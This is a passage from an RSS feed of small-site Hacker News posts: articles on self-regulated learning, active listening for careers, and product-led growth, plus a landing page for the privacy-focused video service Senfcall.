<p>If you’re a student reading this, you probably haven’t yet discovered that the information shared by your teacher is not enough to help you get a <a href="https://durmonski.com/book-summaries/bullshit-jobs/" target="_blank" aria-label="nice job (opens in a new tab)" rel="noreferrer noopener">nice job</a> or <a href="https://durmonski.com/business/fewer-moving-parts/" target="_blank" aria-label="start a business (opens in a new tab)" rel="noreferrer noopener">start a business</a>. If you have already dealt with the school bureaucracy, fought your way through countless exams and unusually not useful school practices, and you’re now a proud owner of a Job, congrats! You know how little our school system has given to us. You know, I hope, how little you know and how much is yet to be explored. Especially today, when things constantly change and where, as many modern authors state, “change is the only constant.”</p>



<p>Our complex and rapidly changing world creates a need, demands a need, for self-initiated and self-managed learning.</p>



<p>If you still don’t know how little you know, and how much you need to acquire to get a new job, keep your current one, or completely change directions, in this article, I’m going to share why it’s so damn important to become master of your own learning process. To become a sophisticated learner. To learn how to learn and to keep doing it till your very last day.</p>







<h2>What Does Self-Regulated Learning Mean?</h2>



<p>Self-regulation in the learning process is commonly related to formal education. We think that becoming better at learning is not for us if we’re not in school. “I graduated with honors. I don’t need to get better at learning,” you might think.</p>



<p>That may be true. I mean, yes, being your teacher’s favorite student is probably a thought that makes you feel all fuzzy and good. But the information you accumulated in school as I just elegantly pointed out, is not enough – it never was – to transform you into a blossoming individual.</p>



<p>A self-regulated learner is a person who is aware of what he’s consuming and actively working towards self-imposed goals to acquire more relevant information. In this case, relevant means things that are closely related to the interests and skills of that person. Or the interests and skills the person wants to acquire. In other words, self-improving, as banal it might sound.</p>



<p>To avoid interpreting what has just been mentioned as something dry and unimaginable, let us give an example:</p>



<p>So, for example, let’s say that you’re a professional photographer. You’re making a living taking pictures. You are good. You have regular clients. Your <a href="https://durmonski.com/private/using-social-media/" target="_blank" aria-label="Instagram (opens in a new tab)" rel="noreferrer noopener">Instagram</a> profile is widely known in your country. Yet, for how long you think this will last?</p>



<p>As stated, things are changing. And they are changing fast. Reportedly, video is becoming more and more popular. In this situation, if you want to get to the next level, you probably need to school yourself on shooting and later editing video. Then, probably, you need to figure out how to properly attune your clip to fit across the newly created social media channels. And then, you need to learn all the growth-hack techniques other online entrepreneurs so enthusiastically share on their profiles. </p>



<p>To put it differently, there is always something new to learn. But this is not always obvious. In most situations, we reach a certain level of expertise and we settle. We get comfortable. And the moment we get too cozy with what we know is the moment others get ahead.</p>



<p>Self-regulation means actively monitoring your learning process. Being mindful about how and from where to obtain, and master, new information. Settings goals and motivating yourself to expand your expertise.</p>



<p>Plainly, continuously asking yourself the following: “Is the thing I’m reading, watching right now, helping me get better at X?”</p>







<h2>Why is Self-Regulated Learning Important?</h2>



<p>To make things even more difficult, if we have to go back to the example of the photographer, the simple realization that one needs to learn new things is not enough to make him better. The person also needs to have a good learning process.</p>



<p>Something we’re not thought in school, sadly.</p>



<p>The school, the system that runs the school, doesn’t do much to teach us how to actually improve our learning skills. It’s presumed that we know how to learn and study. The material is handed to us and we are expected to know what to do with it.</p>



<p>Or as stated in a scientific paper about self-regulated learning, “There is an overwhelming assumption in our educational system that the most important thing to deliver to students is content.”<span id="easy-footnote-1-13224"></span><span><a href="#easy-footnote-bottom-1-13224" title="Self-Regulated Learning: Beliefs, Techniques, and Illusions &amp;#8211; <a href=&quot;https://www.annualreviews.org/doi/abs/10.1146/annurev-psych-113011-143823&quot; target=&quot;_blank&quot; aria-label=&quot; (opens in a new tab)&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>Annual Reviews</a>."><sup>1</sup></a></span></p>



<p>Besides sharing what is supposedly thought from teachers as great content, there is also a need to organize and remember that content. And today, in the 21st century, there is also the need to find great content. Since there is so much stuff out there, you need to know how to adequately sort the good from the clickbait-y.</p>



<p>Regrettably, schools are not actively teaching us about these things. We’re given a lecture. A paper with resources. Commonly also some sort of assignment. And that’s it. We need to figure how to best connect the pieces. But that’s not the worst of it. We’re also not though that these things also need to happen outside school premises – when we now have jobs and families. That after there is no longer a teacher who is monitoring your assignments and actually imposing them on you, that you should take his role and set assignments for yourself.</p>



<p>When we don’t know any of these things, they end in the graph unknown unknowns.<span id="easy-footnote-2-13224"></span><span><a href="#easy-footnote-bottom-2-13224" title="There are known knowns &amp;#8211; <a href=&quot;https://en.wikipedia.org/wiki/There_are_known_knowns&quot; target=&quot;_blank&quot; aria-label=&quot; (opens in a new tab)&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>WIKI</a>."><sup>2</sup></a></span> Or in other words, things we don’t know exist. Hence, we don’t do them. And since we don’t do them, we never get better at what we do.</p>



<p>Self-regulating your learning process involves creating your own curriculum – being both the teacher and the student. This involves seriously considering what you want to learn and how you need to approach this subject.</p>







<h2>What Are The Self-Regulated Learning Fundamentals?</h2>



<p>Intuitively, high-achievers know how to approach learning. Or they simply found the best way for them after years of trial and error. Others, in contrast, simply go with the flow and do the most obvious exercise when trying to learn something new: they consume the information in front of them, never actually looking for resources on their own, and hope that some of the facts will stick.</p>



<p>These are not the best strategies, though.</p>



<p>The point of becoming sophisticated as a learner requires knowing how to manage your own learning activities.</p>



<p>It requires planning and the process is guided by metacognition (thinking about thinking). Or in our case, thinking about how to learn better.</p>



<figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg" alt="thinking about how to learn better" srcset="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-150x75.jpg 150w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20512'%3E%3C/svg%3E" data-lazy-srcset="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-150x75.jpg 150w, https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better.jpg 2000w" data-lazy-src="https://durmonski.com/wp-content/uploads/2021/02/thinking-about-how-to-learn-better-1024x512.jpg"><figcaption>Learning new things is very useful, of course, but the danger is that the act of soaking up new facts without first setting up a process can become a time-wasting activity.</figcaption></figure>







<p>This is a deliberate thought process that one must consider before actually approaching anything new. In simple words, this means that you don’t just open Google and start endlessly browsing articles. You first ask yourself: “What do I want to learn?; Why do I want to learn this?” You set expectations and goals. You consider your weaknesses in the learning process and find resources that are most likely to appeal to your persona.</p>



<p>Instead of relying on the algorithms to show you great content, you approach things strategically – you search for great content based on your goal.</p>



<p>Here are the fundamentals to create your own learning process:</p>



<ul><li><strong>Establish a plan and find resources</strong>: The first requirement, sort to say, is asking yourself what do you want to learn and why. Then, figure out what sources you’ll use, and how you’ll find them, to learn the desired thing. And finally, set a learning schedule and form a plan that will help you along the way.</li><li><strong>Monitoring and maintenance of knowledge</strong>: This is often overlooked. You can’t expect to remember everything from your first attempt. You should monitor yourself and find gaps in your skills – your processes. Then, find new ways to approach things that are hard for you to understand. Additionally, since often learning something new requires retention of certain facts, writing down the most important things is also a must.</li><li><strong>Self-reflection and adapting</strong>: Getting a good grade in school feels awesome. Launching a product and making sales is amazing. But these things are just outcomes. Often, the results we get are a lot of times based on luck, not always dependent on what we did. That’s why it’s far more important to reflect on what you think you did that get you these results and why.</li></ul>



<p>Now, once we have the fundamentals, let’s expand this further…</p>







<h2>How to Best Approach Something New?</h2>



<p>To put all of the above into practice, let’s consider another following example:</p>



<p>You just graduated from school. And while you are relieved, …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://durmonski.com/self-improvement/what-is-self-regulated-learning/">https://durmonski.com/self-improvement/what-is-self-regulated-learning/</a></em></p>]]>
            </description>
            <link>https://durmonski.com/self-improvement/what-is-self-regulated-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114006</guid>
            <pubDate>Fri, 12 Feb 2021 14:33:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Active Listening to Boost Your Career]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26113297">thread link</a>) | @ochronus
<br/>
February 12, 2021 | https://ochronus.online/active-listening-boosts-careers/ | <a href="https://web.archive.org/web/*/https://ochronus.online/active-listening-boosts-careers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-url="https://ochronus.online/active-listening-boosts-careers/" data-title="Use Active Listening to Boost Your Career">
<h2 id="0-what-is-active-listening-" data-kb-block="kb-adv-heading_2b06d7-a8"><strong>What is active listening?</strong></h2>
<p>Active listening is the ability to focus completely on a speaker, understand their message, comprehend the information and respond thoughtfully, in a relevant way. Compared to passive listening, this highly valued interpersonal communication skill ensures you’re able to engage with your peer and later recall specific details without needing information repeated. Your partner will feel cared for and listened to, which results in building genuine and honest relationships.</p>
<p>To practice active listening, you make a conscious effort to hear not only the words that another person is saying but, more importantly, the&nbsp;complete message&nbsp;being communicated, subtle hints and non-verbal messages included, such as tone, emphasis, facial expressions and body language.</p>
<p>Active listening is always neutral and nonjudgmental from the listener’s side.</p>
<p>Finally, to practice active listening, you turn an otherwise passive process into an interactive flow by techniques such as eye contact, asking follow-up questions and reflecting back what was said.<br></p>
<h2 id="1-why-is-active-listening-essential-in-a-work-environment-" data-kb-block="kb-adv-heading_14e87a-de"><strong>Why is active listening essential in a work environment?&nbsp;</strong></h2>
<p>First and foremost, <strong>it helps you build trust</strong>. When people know they can speak freely to you without interruptions and judgment, they’ll be more likely to confide in you. This is especially helpful when meeting a new customer or business contact with whom you want to develop a long-term working relationship.</p>
<p><strong>It helps you build genuine and honest connections. </strong>Active listening helps others feel comfortable sharing information with you. When you demonstrate your willingness and ability to listen to what others have to say truly, people will be motivated to communicate with you on a regular basis. This can open up opportunities to collaborate with others, get work done quickly or start new projects. All of these things can help lead you to success in your career. As a manager, this skill is also essential to your success – in fact, the lack of it is <a href="https://ochronus.online/engineering-manager-4-ways-of-failure/#3-4-too-much-solving-not-enough-listening">one of the key ways to fail</a>.</p>
<p><strong>It helps you increase your knowledge and understanding of various topics. </strong>The best employees are always striving to learn something new and grow their knowledge base. Because active listening helps you retain information, it will also help you better understand new topics and remember what you’ve learned so you can apply it in the future.</p>
<p><strong>It helps you identify and solve problems. </strong>Actively listening to others will help you detect challenges and difficulties others face or problems within projects. The more quickly you’re able to spot these issues, you sooner you can find a solution or create a plan to address it.</p>
<h2 id="2-how-can-active-listening-be-beneficial-while-searching-for-a-job-" data-kb-block="kb-adv-heading_6339e7-8f"><p><strong>How can active listening be beneficial while searching for a job?</strong></p></h2>
<p>Active listening is beneficial throughout the whole process of searching for a job.&nbsp;</p>
<p>When you look at job advertisements and research companies, you can look for clues that might help you learn more about the company before you apply. Don’t just look at the words, though. Try to identify the tone of the post. Does the job posting use formal language? Casual? Conversational? Does it use a lot of technical jargon or industry language? Does it seem frantic? All of these can help determine what the job and company are like and help you decide if you want to apply. Actively listen to the company website’s tone to learn more about the company culture. What images do they use? Are they stock photos, formal portraits, or candid images? Are there videos you can watch (and listen to!)? How formal or informal is the narrator? What do you find on social media? All of these clues can help you figure out if the company is the right fit for you.</p>
<figure><img width="1024" height="683" src="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg" alt="tim mossholder GOMhuCj O9w unsplash" srcset="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg 1024w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-300x200.jpg 300w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-768x512.jpg 768w" sizes="(max-width: 1024px) 100vw, 1024px" title="Use Active Listening to Boost Your Career 3" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20683'%3E%3C/svg%3E" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg 1024w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-300x200.jpg 300w, https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-768x512.jpg 768w" data-lazy-src="https://ochronus.online/wp-content/uploads/2021/02/tim-mossholder-GOMhuCj-O9w-unsplash-1024x683.jpg"><figcaption>Photo by <a href="https://unsplash.com/@timmossholder?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noopener">Tim Mossholder</a> on <a href="https://unsplash.com/s/photos/hiring?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noopener">Unsplash</a></figcaption></figure>
<p>Naturally, the best place to utilize your active listening skills is the interview. You gather much more information this way, both because of encouraging your interviewer to be more honest with you and asking clarifying and follow-up questions. Active listening can also boost your evaluation during and after an interview. More and more companies recognize that good communication skills are essential for job success and even company culture and are actively looking for it during interviews. Even if you interview at a company which does not focus on this, you will leave a good impression by being an active listener – you’ll seem more interested in the job than other candidates. It will be in general much more enjoyable for the interviewer to talk to you. Last but not least, actively listening to your interviewer, you’ll get a glimpse of what kind of communication standards are present in your target company and whether you’d enjoy working there.</p>

<h2 id="3-how-can-you-best-practice-active-listening-" data-kb-block="kb-adv-heading_3396a3-a4"><p><strong>How can you best practice active listening?</strong></p></h2>
<p>Active listening starts with the <strong>right intent</strong>. If you don’t actually care about what the other person wants to say it will be tough to listen genuinely. We are frequently rushing from meeting to meeting, and our minds are already on the next thing we need to do when talking to someone. Slowing down and taking some time (even a minute can help!) to refocus our attention and prepare right before the discussion starts is essential. If you know the topic in advance, think a bit about it while considering your peer’s context with regards to it. What is their potential goal with the conversation, what do they hope to get out of it? What mindset would that result in, and how could that influence the discussion? How can you best support them?</p>
<p><strong>Be curious</strong> about what the other person has to say. Actively work on putting your judgment aside and be neutral, even when what they say strikes a nerve. Giving feedback is generally not a part of active listening, it comes after that and only if the other person asked for it.</p>
<p>Giving <strong>verbal and non-verbal affirmations and cues</strong> is key so that your peer actually feels that you are listening to them.</p>
<p><strong>Don’t interrupt</strong> your partner while they are speaking. Use non-verbal cues to demonstrate that you’re following along.</p>
<p><strong>Shut down your internal dialogue</strong> – this both helps you focus and keeps you judgment-free.</p>
<p><strong>Be patien</strong>t with the other person – you might feel the discussion is dragging on but remember your role is to listen, not to enforce your agenda! On a related note, don’t abruptly change the subject until you’ve made sure your peer said what they wanted to about the topic at hand.</p>
<h3 id="4-%C2%A0-what-are-some-verbal-ways-to-demonstrate-active-listening-" data-kb-block="kb-adv-heading_0a582e-27">&nbsp;<p><strong>What are some verbal ways to demonstrate active listening?</strong></p></h3>
<div id="ub_click_to_tweet_2e93aedf-b3c7-4b1f-a68f-02ac99c7326e"><p>A <a href="https://www.tandfonline.com/doi/abs/10.1080/08934215.2011.610731" target="_blank" rel="noopener">2011 study</a> concluded that active listening was primarily associated with verbal social skills.</p></div>
<p>One of the most important techniques to verbally demonstrating active listening is paraphrasing. This is a form of reflecting on what you’ve heard by summarizing the message’s main points in your own words. When you do this, you show that you understand the message and you’re also giving a chance to your peer to clarify or expand it further. An example: “So you’re basically saying that our training process works in general, but could use some improvement, right?</p>
<p>Asking <strong>open-ended follow-up questions</strong> is equally important. Ask these questions in a way that demonstrates that you’ve gathered the essence of what your partner was saying and also guide them to share more or more in-depth information. This technique can be used together with paraphrasing. Open-ended questions are ones that cannot be answered with a simple “yes” or “no” but instead require your peer to elaborate. An example, building on the previous paragraph: “I understand you feel our training process could be improved – what changes would you like to see?”</p>
<p>Besides open-ended questions, you can ask more specific probing questions too. These questions drill deeper into topics or can be used to narrow down the scope of a subject that might be too broad to discuss in one setting. Example: “Could you elaborate a bit on how the sequencing of training sessions was unhelpful?”&nbsp;</p>
<p>Learn more about questions as a coaching technique here: <a href="https://ochronus.online/questions-vs-directions/">Coaching Questions vs. Giving Directions – Ochronus online</a></p>
<p><strong>Displaying empathy</strong> goes a long way in conversations and is key in active listening. Ensure your peer understands that you recognize their emotions and maybe even share their feelings. Go a step further with showing compassion which will help you connect with your partner and establish mutual trust. Example: “Going through that kind of an experience must have been hard for you; I’m really sorry!”</p>
<p>You can <strong>share similar experiences</strong> to show you deeply understand what your peer is talking about. It will also help build the relationship and – depending on the goal of the situation – can turn into you giving valuable advice about how you’ve solved similar challenges in the past. Example: “I also had a tough time with the training process years ago. This is how I made it better: ….”</p>
<p><strong>Short verbal affirmations and cues</strong> are probably the easiest way to show that you’re following along and are still engaged. Some of these can even be used while the speaker is talking without interrupting them. Examples: “Mhm”, “I see”, “I agree”.</p>
<p>Nothing demonstrates that you care about your peer and the topic at hand than <strong>recalling relevant, previously shared information</strong>. Example: “Oh, true, and I remember you shared your ideas about improving our training process – let’s make sure we implement those ideas!”</p>
<h3 id="5-what-are-some-non-verbal-ways-to-demonstrate-active-listening-" data-kb-block="kb-adv-heading_343c56-85"><p><strong>What are some non-verbal ways to demonstrate active listening?&nbsp;</strong></p></h3>
<p>Non-verbal cues are just as important as verbal ones in active listening, and there is a set of simple things you can do here. Use a combination of the following techniques:</p>
<p>Maintaining <strong>eye contact</strong> is a sure way to make the speaker feel you’re focused on them. Make sure your gaze is natural and conveys a feeling of interest and care.</p>
<div>
<div>
<figure><picture title="Use Active Listening to Boost Your Career 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-scaled.jpg.webp 2560w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-300x225.jpg.webp 300w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1024x769.jpg.webp 1024w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-768x576.jpg.webp 768w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1536x1153.jpg.webp 1536w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-2048x1537.jpg.webp 2048w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%202560%201921'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 2560px) 100vw, 2560px">
<img width="2560" height="1921" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%202560%201921'%3E%3C/svg%3E" alt="smile" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-scaled.jpg 2560w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-300x225.jpg 300w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1024x769.jpg 1024w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-768x576.jpg 768w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-1536x1153.jpg 1536w, https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-2048x1537.jpg 2048w" data-lazy-sizes="(max-width: 2560px) 100vw, 2560px" data-lazy-src="https://ochronus.online/wp-content/uploads/2021/02/caju-gomes-QDq3YliZg48-unsplash-edited-2-scaled.jpg">
</picture>
</figure>
</div>
<p><strong>Smiling</strong> is one of our best tool to display positive emotions. Use it generously during your active listening sessions. A smile can take the place of a short verbal affirmation in helping to diffuse any tension and ensure the speaker feels comfortable.</p>
</div>
<p><strong>Nodding </strong>is a helpful and supportive cue and can not only signal that you’re following …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/active-listening-boosts-careers/">https://ochronus.online/active-listening-boosts-careers/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/active-listening-boosts-careers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26113297</guid>
            <pubDate>Fri, 12 Feb 2021 13:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I changed my mind about product-led growth]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112997">thread link</a>) | @gk1
<br/>
February 12, 2021 | https://www.gkogan.co/blog/product-led-growth/ | <a href="https://web.archive.org/web/*/https://www.gkogan.co/blog/product-led-growth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Whether it was our first call or our hundredth, founders inevitably asked me whether they should market and sell their enterprise software to buyers/executives (top-down) or to users (bottom-up). My view, which only strengthened every time I uttered it, was this:</p>

<p>Marketing and selling to users is just another, roundabout way of getting to the buyer. Compared with the top-down approach — think whitepapers and meetings with the CIO — it takes more effort and time to see a payoff. More effort because users want a smooth self-serve experience, which means more product work. More time because big budget decisions are made at the executive level, which means you are just adding more hoops to hop through before meeting the CIO.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/e1d7c01d1b02afb36c6da331334936f4823d9ce9/0dfc5/images/uploads/343.jpg" alt="Cartoon about dogs in the board room."></p>

<p>More recently this inevitable question evolved from “top-down or bottom-up?” to “what do you think of product-led growth?”</p>

<p><a href="https://www.gkogan.co/product-led-growth/">Product-led growth</a> is the strategy of getting to the users first. It emphasizes letting users see, test, and get value from the product quickly and on their own. Since it’s an evolution of “bottom-up,” my answer was more or less the same.</p>

<p>Sure, there were success stories like Atlassian and GitLab, but those were exceptions to the rule, especially for enterprise software.</p>

<p><strong>I was wrong.</strong></p>

<p>Although the clues had been all around me for months, I paid them no mind until they hit me in the face in quick succession:</p>

<ul>
  <li>
    <p>Late in November I had an intro call with yet another founder interested in product-led growth.</p>
  </li>
  <li>
    <p>A week later, another founder brought up product-led growth. Not as a question but as a decision they’ve made. (I now <a href="https://www.gkogan.co/blog/pinecone/">work</a> for this <a href="https://www.pinecone.io/">company</a> in part because of that decision.)</p>
  </li>
  <li>
    <p>The next day, I attended several sessions at FC Build, where CEOs of unicorn and public companies mentioned product-led growth either as a major contributor to their growth or a major area of focus in the future.</p>
  </li>
  <li>
    <p>The day after, I spoke on a panel about developer marketing, with other panelists from Twilio, Google Cloud, and Sequoia. In this discussion I heard “developer marketing” used interchangeably with “product-led growth.” (Much of my work involves marketing to developers, yet I never thought of it as product-led growth.) The event organizer holds a panel like this every month, and this one had the most attendants of all.</p>
  </li>
  <li>
    <p>A week later, Tomasz Tunguz of Redpoint Ventures made a <a href="https://tomtunguz.com/2021-predictions/">prediction</a> that “Product-led growth [will become] the standard GTM for software and infrastructure companies” in 2021.</p>
  </li>
</ul>

<hr>

<p><em>By the way, I write an article like this every month or so, covering lessons learned from growing B2B software startups. Get an email update when the next one is published:</em>
<!-- Begin MailChimp Signup Form --></p>



<!--End mc_embed_signup-->
<hr>

<p>Over a few reflective days in December, other clues from the past year started coming into focus:</p>

<ul>
  <li>
    <p>My three biggest opportunities of the year — two unicorns and one Fortune-50 company — revolved around product-led growth. (Having failed to recognize it at the time, I lost those opportunities.)</p>
  </li>
  <li>
    <p>Some of the projects I enjoyed most were really about product-led growth: Launching a trial and growing data scientist users for <a href="https://www.dominodatalab.com/">Domino Data Lab</a>, increasing self-serve revenue from developers for <a href="https://www.netlify.com/">Netlify</a>, and commercializing open-source software for <a href="https://www.goteleport.com/">Teleport</a>.</p>
  </li>
  <li>
    <p>Seemingly every one of my startup clients and every other prospective client had asked me about product-led growth at some point, indicating widespread interest among founders and their investors.</p>
  </li>
  <li>
    <p>As I researched enterprise software companies that recently went public for my <a href="https://www.gkogan.co/blog/category-creation/">category creation</a> post, I noticed more than half of them offer free trials.</p>
  </li>
</ul>

<p>To ensure I wasn’t just seeing what I wanted to see, I emailed five investors with a question: “How much (or little) demand are you seeing for product-led growth compared to enterprise demand-gen?” Four out of five confirmed seeing strong demand and opportunity for product-led growth among startups; one remained neutral.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/399f678b2d026ec46d1dbd67095ad42bd7552e52/80e97/images/uploads/370.jpg" alt="Cartoon about getting a second opinion."></p>

<p>The trend was clear: Software purchasing decisions are increasingly starting with the users. “What tools do my engineers need,” “what do they already use,” “can they try this,” “what do they think of this?” Ironically, calling the CIO is now a roundabout way of getting to the users.</p>

<p>I changed my mind about product-led growth. Software companies not already targeting users (over buyers) should consider changing theirs.</p>


    <p>◼</p>

    <p>PS - Liked this article? I write one every month or so, covering lessons learned on B2B startup growth. Don't miss the next one:</p>

    <!-- Begin MailChimp Signup Form -->
    

    <!--End mc_embed_signup-->
    
    <p>If you need help with marketing and revenue growth, <a href="https://www.gkogan.co/contact/">get in touch</a>.</p>

  </div>

  

  
  
  



</article>

<!-- Begin MailChimp popup signup form -->



<!-- End MailChimp popup signup form -->
      </div>
    </div></div>]]>
            </description>
            <link>https://www.gkogan.co/blog/product-led-growth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112997</guid>
            <pubDate>Fri, 12 Feb 2021 12:40:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Senfcall.de – Privacy respecting video conferencing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112448">thread link</a>) | @dschuessler
<br/>
February 12, 2021 | https://www.senfcall.de/en/ | <a href="https://web.archive.org/web/*/https://www.senfcall.de/en/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<div>
			
<div>
    <div>
        
			
        
			
        
			
        
			
        
			
        <div>
            <p><img src="https://www.senfcall.de/shield.svg" alt="Icon Data-minimising"></p><div>
                <h3>Data-minimising</h3>
                <p>We only collect the data that is necessary for the service. All data is processed on a <strong>server in Germany</strong>.</p>

            </div>
        </div>
        
        
			
        <div>
            <p><img src="https://www.senfcall.de/compass.svg" alt="Icon Without installation"></p><div>
                <h3>Without installation</h3>
                <p>You can use Senfcall <strong>easily via web browser</strong> on all your devices, without any installation! No additional software that creates new security holes.</p>

            </div>
        </div>
        
        
			
        <div>
            <p><img src="https://www.senfcall.de/check-square.svg" alt="Icon GDPR compliant"></p><div>
                <h3>GDPR compliant</h3>
                <p>Senfcall breathes the spirit of the GDPR. We don't wrap ourselves around the rules, but treat <strong>data protection as a first-class citizen</strong>.</p>

            </div>
        </div>
        
        
			
        <div>
            <p><img src="https://www.senfcall.de/code.svg" alt="Icon Open-Source"></p><div>
                <h3>Open-Source</h3>
                <p>For Senfcall we use the <strong>Open Source</strong> Web Conference Tool <a href="https://github.com/bigbluebutton/bigbluebutton">BigBlueButton™</a>. Moreover, we publish some of <a href="https://www.senfcall.de/opensource">our own tools</a> under free licences.</p>

            </div>
        </div>
        
        
    </div>
</div>


<div>
    
<p>Many claim: "Reliable video conferencing? Only big companies in Silicon Valley can do that". But these companies are repeatedly criticised for endangering our privacy and the security of our computers.</p>
<p>As students in Darmstadt and Karlsruhe, we were forced by our universities to use the applications of such companies. That's why we want to show that video communication for digital family visits, web seminars, teaching and conferences also works with data protection. With Senfcall we offer videoconferencing via the open source software <a href="https://bigbluebutton.org/">BigBlueButton™</a>. The advantage: to use Senfcall you only need your web browser - no additional software that creates new security holes.</p>
<p>So that you can also use privacy protecting video conferences.</p>
<p>Senfcall uses BigBlueButton and is not endorsed or certified by BigBlueButton Inc. BigBlueButton and the BigBlueButton Logo are trademarks of BigBlueButton Inc..</p>

</div>




		</div>
	</section></div>]]>
            </description>
